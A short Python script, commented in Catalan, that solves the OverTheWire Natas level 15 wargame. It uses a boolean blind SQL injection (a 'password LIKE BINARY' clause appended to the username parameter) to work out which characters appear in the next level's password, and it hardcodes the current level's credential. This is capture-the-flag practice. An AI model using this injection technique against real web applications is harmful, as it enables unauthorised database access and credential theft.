import requests, string

url = "http://natas15.natas.labs.overthewire.org"
username = "natas15"
# Password del nivell on estic
password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
# Les contrasenyes del natas no tenen símbols per tant ens els estalviarem
# Posem tots els caràcters i lletres de l'abecedari (tant majúscules com minúscules)
characters = ''.join([string.digits,string.ascii_letters])

# Ara fem un for i anem guardant els caràcters que anem trobant per utilitzar-los després al segon script
Passchar = []
# El que ens retorna l'aplicació web quan troba un usuari que existeix
userExist = 'This user exists.'

#BINARY perquè no sigui case sensitive
for i in characters:
    uri =''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"%',i,'%','&debug'])
    r = requests.get(uri, auth=(username, password))
    if userExist in r.text:
        Passchar.append(i)
        print(i)

print(Passchar)